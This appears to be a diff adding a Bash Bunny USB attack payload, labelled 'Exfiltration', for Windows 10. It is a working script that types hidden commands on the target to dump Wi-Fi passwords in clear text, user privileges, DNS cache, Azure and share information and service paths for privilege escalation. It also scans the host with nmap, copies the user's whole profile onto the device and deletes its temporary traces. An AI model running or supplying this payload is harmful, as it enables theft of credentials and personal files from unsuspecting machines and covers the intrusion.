@@ -1,0 +1,63 @@
+REM Title:         		OooohThatsHandy
+REM Description:   		Extract useful information such as nmap, wifi keys, DNS Cache, User privilieges and group memberships, user folder contents with images and documents, shared folders 
+REM OS:			   		Designed for Win 10
+REM Author:        		Twitter @PeteDavis91
+REM Version:       		0.6
+REM Category:      		Exfiltration
+REM Attackmodes:   		HID Storage RNDIS_ETHERNET
+REM Credz:		   		Hak5 Darren obviously, 0iphori3 and Cribbit 
+
+
+REM LED CODES:
+REM SOLID BLUE LED:			Setting Up
+REM FAST BLUE LED: 			Creating Data
+REM VERY FAST BLUE LED:		Exporting Data Created and Discovered
+REM SOLID WHITE LED:		Cleaning up and finalizing
+REM FINISH GREEN LED: 		Safe to remove your Bash Bunny - Enjoy the data 
+
+REM OPTIONS
+REM This option is used for the transferring the user profile onto the BashBunny. Set in milliseconds, the longer you can wait the more data you will get. 
+NoTimeToHangAround=30000
+
+REM This section sets up the BashBunny
+LED B SOLID
+Q DELAY 1000
+DUCKY_LANG gb
+ATTACKMODE HID STORAGE RNDIS_ETHERNET
+Q DELAY 1000
+GET TARGET_IP
+Q DELAY 500
+
+REM This section runs commands to create logs and data for export
+LED B FAST
+Q DELAY 500
+mkdir /root/hostsideloot
+Q DELAY 1000
+nmap -sC -O -F $TARGET_IP >> /root/hostsideloot/nmap.txt
+Q DELAY 1000
+RUN WIN 'cmd /minimized /c mkdir %TEMP%\LOOK && netsh wlan show profile * key=clear > %TEMP%\LOOK\WiFi.txt & whoami /all > %TEMP%\LOOK\UserGroupsPrivs.txt'
+Q DELAY 1000
+RUN WIN 'cmd /minimized /c ipconfig /displaydns > %TEMP%\LOOK\DNSCache.txt & dsregcmd /status > %TEMP%\LOOK\AzureInfo.txt & net share > %TEMP%\LOOK\Shares.txt' 
+Q DELAY 1000
+RUN WIN "powershell -W Hidden -c \$s = gwmi win32_service; echo \$s.pathname | Out-File -FilePath %TEMP%\\LOOK\\CheckForUnquoted.txt"
+
+
+REM This section exports the previously created data as well as the running user profile with images and documents 
+LED B VERYFAST
+Q DELAY 50
+RUN WIN "powershell -W Hidden -c \$destination = ((gwmi win32_volume -f '\"label=''BashBunny'''\").Name); robocopy \$env:TEMP\\LOOK \$destination\\loot\\"
+Q DELAY 1000
+RUN WIN "powershell -W Hidden -c \$destination = ((gwmi win32_volume -f '\"label=''BashBunny'''\").Name); robocopy \$env:USERPROFILE \$destination\\loot\\ /E /W:1 /R:1 /NP /MT /XD \"\$env:APPDATA\" \"\$env:LOCALAPPDATA\" \"\$env:USERPROFILE\\AppData\""
+Q DELAY $NoTimeToHangAround
+
+
+REM Cleanup and finalizing
+LED W SOLID
+mv /root/hostsideloot/nmap.txt /root/udisk/loot/
+RUN WIN 'cmd /c rmdir /s /q %TEMP%\LOOK' 
+rmdir /root/hostsideloot
+
+
+ATTACKMODE FINISH
+LED G FINISH 
+
